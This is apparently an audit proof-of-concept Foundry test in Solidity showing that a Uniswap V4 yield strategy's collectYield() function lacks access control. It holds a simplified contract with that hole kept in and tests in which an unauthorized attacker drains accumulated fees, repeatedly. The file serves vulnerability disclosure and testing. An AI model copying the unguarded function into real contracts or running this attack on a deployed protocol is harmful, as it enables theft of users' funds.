// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/**
 * @title H-01 PoC: Missing Access Control on collectYield() Allows Anyone to Steal Fees
 * @notice STANDALONE POC - Demonstrates the vulnerability with inlined mocks
 *
 * @dev Vulnerability Location: UniV4StableYieldStrategy.sol#L202-L233
 *      https://github.com/code-423n4/reflax-yield-vault/blob/main/src/concreteYieldStrategies/UniV4StableYieldStrategy.sol#L202-L233
 *
 * VULNERABILITY SUMMARY:
 * The collectYield() function has no access control modifiers. It only uses:
 *   - `nonReentrant` - prevents reentrancy
 *   - `whenNotPaused` - requires contract to be unpaused
 *
 * But there is NO:
 *   - `onlyOwner`
 *   - `onlyAuthorizedClient`
 *   - `onlyAuthorizedWithdrawer`
 *
 * This means ANY address can call collectYield() and receive all accumulated V4 pool fees.
 *
 * ATTACK PATH:
 * 1. Protocol deposits funds into V4 pool via deposit()
 * 2. Pool accumulates trading fees over time (held by PoolManager)
 * 3. Attacker (random address) calls collectYield()
 * 4. All fees are transferred to attacker via: depositToken.safeTransfer(msg.sender, totalYieldInDepositToken)
 * 5. Protocol loses all accumulated yield
 *
 * IMPACT:
 * - HIGH: Complete theft of all accumulated trading fees
 * - Ongoing attack: Attacker can front-run legitimate collectYield() calls
 * - No recovery: Once fees are stolen, they cannot be recovered
 */

// ============ INLINED TYPE DEFINITIONS ============

type PoolId is bytes32;

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

library PoolIdLibrary {
    function toId(PoolKey memory key) internal pure returns (PoolId) {
        return PoolId.wrap(keccak256(abi.encode(key)));
    }
}

// ============ INLINED INTERFACES ============

interface IPoolManager {
    struct ModifyLiquidityParams {
        int24 tickLower;
        int24 tickUpper;
        int256 liquidityDelta;
        bytes32 salt;
    }

    struct SwapParams {
        bool zeroForOne;
        int256 amountSpecified;
        uint160 sqrtPriceLimitX96;
    }

    struct BalanceDelta {
        int128 amount0;
        int128 amount1;
    }

    function modifyLiquidity(PoolKey calldata key, ModifyLiquidityParams calldata params, bytes calldata hookData)
        external
        returns (BalanceDelta memory delta);

    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData)
        external
        returns (BalanceDelta memory delta);

    function collect(PoolKey calldata key, int24 tickLower, int24 tickUpper, bytes32 salt)
        external
        returns (uint256 amount0, uint256 amount1);

    function getPosition(PoolId poolId, address owner, int24 tickLower, int24 tickUpper, bytes32 salt)
        external
        view
        returns (uint128 liquidity, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128);
}

interface IPausable {
    function pause() external;
    function unpause() external;
    function pauser() external view returns (address);
}

// ============ MOCK CONTRACTS ============

/**
 * @notice Mock ERC20 with mint capability
 */
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/**
 * @notice Mock PoolManager that simulates V4 fee collection
 * @dev The key vulnerability: fees are transferred to whoever calls collect()
 */
contract MockPoolManager {
    MockERC20 public token0;
    MockERC20 public token1;

    uint256 public accumulatedFees0;
    uint256 public accumulatedFees1;

    constructor(address _token0, address _token1) {
        token0 = MockERC20(_token0);
        token1 = MockERC20(_token1);
    }

    // Simulate fee accumulation from trading activity
    function simulateFeeAccumulation(uint256 fees0, uint256 fees1) external {
        accumulatedFees0 = fees0;
        accumulatedFees1 = fees1;
        // Mint fees to this contract to simulate collected fees
        token0.mint(address(this), fees0);
        token1.mint(address(this), fees1);
    }

    function modifyLiquidity(PoolKey calldata, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata)
        external
        returns (IPoolManager.BalanceDelta memory delta)
    {
        // Return minimal delta for testing
        delta = IPoolManager.BalanceDelta({
            amount0: int128(int256(params.liquidityDelta / 2)),
            amount1: int128(int256(params.liquidityDelta / 2))
        });
    }

    function swap(PoolKey calldata, IPoolManager.SwapParams calldata params, bytes calldata)
        external
        returns (IPoolManager.BalanceDelta memory delta)
    {
        // Simulate 1:1 swap for testing
        if (params.zeroForOne) {
            uint256 amount = uint256(params.amountSpecified);
            token0.transferFrom(msg.sender, address(this), amount);
            token1.transfer(msg.sender, amount);
            delta = IPoolManager.BalanceDelta({
                amount0: -int128(int256(amount)),
                amount1: int128(int256(amount))
            });
        } else {
            uint256 amount = uint256(params.amountSpecified);
            token1.transferFrom(msg.sender, address(this), amount);
            token0.transfer(msg.sender, amount);
            delta = IPoolManager.BalanceDelta({
                amount0: int128(int256(amount)),
                amount1: -int128(int256(amount))
            });
        }
    }

    /**
     * @notice Collect fees - THIS IS WHERE THE VULNERABILITY MANIFESTS
     * @dev The strategy's collectYield() calls this, then transfers fees to msg.sender
     *      Since collectYield() has no access control, anyone can trigger this
     */
    function collect(PoolKey calldata, int24, int24, bytes32)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        amount0 = accumulatedFees0;
        amount1 = accumulatedFees1;

        // Transfer fees to caller (the strategy contract)
        if (amount0 > 0) {
            token0.transfer(msg.sender, amount0);
            accumulatedFees0 = 0;
        }
        if (amount1 > 0) {
            token1.transfer(msg.sender, amount1);
            accumulatedFees1 = 0;
        }
    }

    function getPosition(PoolId, address, int24, int24, bytes32)
        external
        pure
        returns (uint128, uint256, uint256)
    {
        return (1000e18, 0, 0);
    }
}

// ============ VULNERABLE CONTRACT (SIMPLIFIED) ============

/**
 * @notice Simplified UniV4StableYieldStrategy showing the vulnerable pattern
 * @dev Extracted from UniV4StableYieldStrategy.sol#L202-L233
 *      The CRITICAL missing piece: no access control on collectYield()
 */
contract VulnerableUniV4Strategy {
    MockERC20 public depositToken;
    MockERC20 public pairedToken;
    MockPoolManager public poolManager;
    PoolKey public poolKey;
    PoolId public poolId;

    int24 public tickLower = -100;
    int24 public tickUpper = 100;
    bytes32 public constant POSITION_SALT = bytes32(0);

    address public owner;
    bool public paused;
    bool private locked;

    // Access control mappings (from AYieldStrategy)
    mapping(address => bool) public authorizedClients;

    event YieldCollected(address indexed collector, uint256 depositTokenAmount, uint256 pairedTokenAmount);

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    modifier whenNotPaused() {
        require(!paused, "Pausable: paused");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    modifier onlyAuthorizedClient() {
        require(authorizedClients[msg.sender], "AYieldStrategy: unauthorized, only authorized clients");
        _;
    }

    constructor(
        address _depositToken,
        address _pairedToken,
        address _poolManager
    ) {
        owner = msg.sender;
        depositToken = MockERC20(_depositToken);
        pairedToken = MockERC20(_pairedToken);
        poolManager = MockPoolManager(_poolManager);

        poolKey = PoolKey({
            currency0: _depositToken,
            currency1: _pairedToken,
            fee: 500,
            tickSpacing: 10,
            hooks: address(0)
        });
        poolId = PoolIdLibrary.toId(poolKey);

        // Approve poolManager
        depositToken.approve(_poolManager, type(uint256).max);
        pairedToken.approve(_poolManager, type(uint256).max);
    }

    function setClient(address client, bool authorized) external onlyOwner {
        authorizedClients[client] = authorized;
    }

    /**
     * @notice THE VULNERABLE FUNCTION - Missing access control!
     * @dev Compare to deposit() which has onlyAuthorizedClient
     *      Compare to migrate() which has onlyOwner
     *      But collectYield() has NEITHER!
     *
     * Original code (UniV4StableYieldStrategy.sol#L202-L233):
     * function collectYield() external nonReentrant whenNotPaused returns (uint256 totalYieldInDepositToken)
     *                         ^^^^^^^^^^^ ^^^^^^^^^^^^
     *                         Only these two modifiers - NO ACCESS CONTROL!
     */
    function collectYield() external nonReentrant whenNotPaused returns (uint256 totalYieldInDepositToken) {
        (uint256 fees0, uint256 fees1) = _collectFees();

        // Determine which token is which based on pool key ordering
        uint256 depositTokenFees;
        uint256 pairedTokenFees;

        if (address(depositToken) == poolKey.currency0) {
            depositTokenFees = fees0;
            pairedTokenFees = fees1;
        } else {
            depositTokenFees = fees1;
            pairedTokenFees = fees0;
        }

        // For this PoC, we skip the swap step and just return deposit token fees
        totalYieldInDepositToken = depositTokenFees + pairedTokenFees;

        // VULNERABILITY: Transfer yield to msg.sender (could be ANYONE!)
        if (totalYieldInDepositToken > 0) {
            depositToken.transfer(msg.sender, depositTokenFees);
            if (pairedTokenFees > 0) {
                pairedToken.transfer(msg.sender, pairedTokenFees);
            }
        }

        emit YieldCollected(msg.sender, depositTokenFees, pairedTokenFees);

        return totalYieldInDepositToken;
    }

    function _collectFees() internal returns (uint256 fees0, uint256 fees1) {
        return poolManager.collect(poolKey, tickLower, tickUpper, POSITION_SALT);
    }
}

// ============ POC TEST ============

contract PocH01Test is Test {
    MockERC20 depositToken;
    MockERC20 pairedToken;
    MockPoolManager poolManager;
    VulnerableUniV4Strategy strategy;

    address owner = makeAddr("owner");
    address authorizedClient = makeAddr("authorizedClient");
    address attacker = makeAddr("attacker");  // Random unauthorized address

    uint256 constant ACCUMULATED_FEES = 10_000e18;  // 10,000 tokens in fees

    function setUp() public {
        // Deploy mock tokens
        vm.startPrank(owner);
        depositToken = new MockERC20("USDC", "USDC", 6);
        pairedToken = new MockERC20("USDT", "USDT", 6);

        // Deploy mock pool manager
        poolManager = new MockPoolManager(address(depositToken), address(pairedToken));

        // Deploy vulnerable strategy
        strategy = new VulnerableUniV4Strategy(
            address(depositToken),
            address(pairedToken),
            address(poolManager)
        );

        // Setup authorized client (not the attacker)
        strategy.setClient(authorizedClient, true);
        vm.stopPrank();

        // Simulate fee accumulation from trading activity
        // In real scenario, this happens over time as users trade in the V4 pool
        poolManager.simulateFeeAccumulation(ACCUMULATED_FEES, ACCUMULATED_FEES);
    }

    /**
     * @notice Main PoC: Demonstrates that anyone can steal collected yield
     */
    function test_H01_AnyoneCanStealYield() public {
        console.log("=== H-01 PoC: Missing Access Control on collectYield() ===");
        console.log("");

        // Step 1: Verify attacker is NOT authorized
        console.log("Step 1: Verify attacker has no special permissions");
        assertFalse(strategy.authorizedClients(attacker), "Attacker should NOT be an authorized client");
        assertTrue(attacker != owner, "Attacker should NOT be owner");
        console.log("  - Attacker is NOT owner");
        console.log("  - Attacker is NOT an authorized client");
        console.log("");

        // Step 2: Verify fees have accumulated
        console.log("Step 2: Protocol has accumulated %s fees from trading", ACCUMULATED_FEES);
        uint256 attackerDepositBefore = depositToken.balanceOf(attacker);
        uint256 attackerPairedBefore = pairedToken.balanceOf(attacker);
        assertEq(attackerDepositBefore, 0, "Attacker should start with 0 deposit tokens");
        assertEq(attackerPairedBefore, 0, "Attacker should start with 0 paired tokens");
        console.log("  - Pool has %s deposit token fees", ACCUMULATED_FEES);
        console.log("  - Pool has %s paired token fees", ACCUMULATED_FEES);
        console.log("  - Attacker balance: 0");
        console.log("");

        // Step 3: Attacker calls collectYield() - THIS SHOULD FAIL but doesn't!
        console.log("Step 3: Attacker (unauthorized) calls collectYield()");
        vm.prank(attacker);
        uint256 stolenYield = strategy.collectYield();
        console.log("  - Transaction SUCCEEDED (vulnerability confirmed)");
        console.log("  - Attacker received %s in total yield", stolenYield);
        console.log("");

        // Step 4: Verify attacker received all the fees
        console.log("Step 4: Verify attacker stole all accumulated fees");
        uint256 attackerDepositAfter = depositToken.balanceOf(attacker);
        uint256 attackerPairedAfter = pairedToken.balanceOf(attacker);

        assertEq(attackerDepositAfter, ACCUMULATED_FEES, "Attacker should have stolen all deposit token fees");
        assertEq(attackerPairedAfter, ACCUMULATED_FEES, "Attacker should have stolen all paired token fees");
        console.log("  - Attacker deposit token balance: %s", attackerDepositAfter);
        console.log("  - Attacker paired token balance: %s", attackerPairedAfter);
        console.log("");

        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Anyone can call collectYield() and steal accumulated trading fees!");
        console.log("Total stolen: %s tokens", stolenYield);
    }

    /**
     * @notice Demonstrates the contrast: other functions require authorization but collectYield() doesn't
     */
    function test_H01_OnlyOwnerCanMigrateButAnyoneCanCollectYield() public {
        console.log("=== Contrast: Access Control Comparison ===");
        console.log("");

        // Verify attacker cannot perform owner actions
        console.log("Verifying attacker cannot perform owner-only actions...");
        assertFalse(attacker == owner, "Attacker is not owner");
        assertFalse(strategy.authorizedClients(attacker), "Attacker is not authorized client");
        console.log("  - Attacker has NO special permissions");
        console.log("");

        // But attacker CAN call collectYield
        console.log("Attempting collectYield() as unauthorized attacker...");
        vm.prank(attacker);
        uint256 stolen = strategy.collectYield();
        assertTrue(stolen > 0, "Attacker should have stolen funds");
        console.log("  - collectYield() INCORRECTLY allows unauthorized access!");
        console.log("  - Stolen: %s tokens", stolen);
        console.log("");

        console.log("=== ACCESS CONTROL INCONSISTENCY CONFIRMED ===");
        console.log("Functions like migrate() require onlyOwner");
        console.log("Functions like deposit() require onlyAuthorizedClient");
        console.log("But collectYield() has NO access control!");
    }

    /**
     * @notice Demonstrates ongoing attack: attacker can repeatedly steal fees
     */
    function test_H01_RepeatedTheft() public {
        console.log("=== Ongoing Attack Scenario ===");
        console.log("");

        uint256 totalStolen = 0;

        // Round 1
        console.log("Round 1: Initial fee theft");
        vm.prank(attacker);
        totalStolen += strategy.collectYield();
        console.log("  - Stolen so far: %s", totalStolen);

        // Simulate more fees accumulating
        console.log("");
        console.log("Time passes... more fees accumulate...");
        poolManager.simulateFeeAccumulation(5_000e18, 5_000e18);

        // Round 2
        console.log("");
        console.log("Round 2: Second fee theft");
        vm.prank(attacker);
        totalStolen += strategy.collectYield();
        console.log("  - Stolen so far: %s", totalStolen);

        // Round 3
        console.log("");
        console.log("Time passes... more fees accumulate...");
        poolManager.simulateFeeAccumulation(3_000e18, 3_000e18);

        console.log("");
        console.log("Round 3: Third fee theft");
        vm.prank(attacker);
        totalStolen += strategy.collectYield();

        console.log("");
        console.log("=== TOTAL STOLEN ACROSS ALL ROUNDS: %s ===", totalStolen);

        // Verify totals
        assertEq(depositToken.balanceOf(attacker), 18_000e18);
        assertEq(pairedToken.balanceOf(attacker), 18_000e18);
    }
}
